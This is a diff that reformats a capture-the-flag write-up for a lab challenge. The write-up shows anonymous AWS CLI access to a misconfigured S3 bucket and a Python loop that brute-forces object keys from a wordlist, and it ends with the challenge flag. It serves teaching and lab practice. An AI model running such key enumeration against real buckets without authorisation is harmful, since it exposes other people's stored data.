@@ -1,11 +1,13 @@
 # AWS Security I
 
 ## Challenge Description
+
 The bucket policy on 'public' bucket allows an anonymous user to read all objects stored in the bucket.
 
 **Objective:**  Interact with the bucket 'public' on the exposed S3 endpoint and retrieve the flag!
 
 ## Instructions
+
 * Once you start the lab, you will have access to a Ubuntu instance.
 * Your Ubuntu Instance has an interface with IP address 192.X.Y.2. Run "ip addr" to know the values of X and Y.
 * The exposed S3 endpoint should be running on port 9000 on the machine located at the IP address 192.X.Y.3.
@@ -14,8 +16,10 @@ The bucket policy on 'public' bucket allows an anonymous user to read all object
 ---
 
 ## Solution
+
 As per the instructions, run `ip addr` to get our instance's IP:
-```
+
+```text
 root@attackdefense:~# ip addr
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
@@ -30,6 +34,7 @@ root@attackdefense:~# ip addr
     inet 192.236.135.2/24 brd 192.236.135.255 scope global eth1
        valid_lft forever preferred_lft forever
 ```
+
 In my case, the endpoint address was `192.236.135.3:9000`.
 
 Searching online, we can find the [documentation](https://awscli.amazonaws.com/v2/documentation/api/latest/index.html) for AWS CLI.
@@ -43,13 +48,16 @@ Here, we find that we can specify the endpoint manually with `--endpoint-url`. S
 We also find that we can use the command `s3api` to interact with the bucket. (I tried `s3` first but couldn't get it working, but I think it's possible to use that as well.)
 
 AWS S3 buckets operate on a key-value basis. We can use the subcommand `get-object` to retrieve an object, given a particular key, using a command like this:
-```
+
+```text
 aws --endpoint http://192.236.135.3:9000 --no-sign-request s3api get-object --bucket public --key test ./flag
 ```
+
 This gets the object in the `public` bucket stored under the key `test`, and stores it to `./flag`.
 
 However, running the above command gives us an error, since we do not know the actual key for the flag:
-```
+
+```text
 An error occurred (NoSuchKey) when calling the GetObject operation: The specified key does not exist.
 ```
 
@@ -64,14 +72,16 @@ for line in wordList:
     line = line.strip('\n')
     os.system(f'aws --endpoint http://192.236.135.3:9000 --no-sign-request s3api get-object --bucket public --key {line} {os.getcwd()}/flag')
 ```
+
 After running the above script, we can read the output file, `flag`, to get the flag.
 
-```
+```text
 root@attackdefense:~# cat flag
 Flag: 155a5314e36f03ec70eadb3c7dd91049
 ```
 
-### Flag:
-```
+### Flag
+
+```text
 155a5314e36f03ec70eadb3c7dd91049
 ```
